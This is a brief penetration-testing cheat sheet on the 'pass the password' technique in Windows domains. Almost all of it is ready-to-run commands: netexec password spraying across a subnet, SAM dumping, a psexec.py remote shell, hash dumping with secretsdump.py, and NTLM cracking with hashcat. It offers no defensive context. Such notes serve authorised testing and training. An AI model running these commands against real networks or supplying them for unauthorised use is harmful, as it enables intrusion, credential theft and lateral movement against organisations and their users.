# Pass the Password

```bash
nxc $network_ip/$cidr -d $domain -u $user -p $password
```

Once you get the pwn3d machines you can psexec or so, or you can even use some modules and options provided by netexec.&#x20;

<pre class="language-bash"><code class="lang-bash"><strong># dumping sam file
</strong><strong>nxc $network_ip/$cidr -d $domain -u $user -p $password --sam
</strong>
psexec.py $domain/$username:$password@$machine_ip

# dump hashes
secretsdump.py $domain/$username:$password@$machine_ip

# crack hashes
hashcat -m 1000 hashfile dict_file -O
</code></pre>
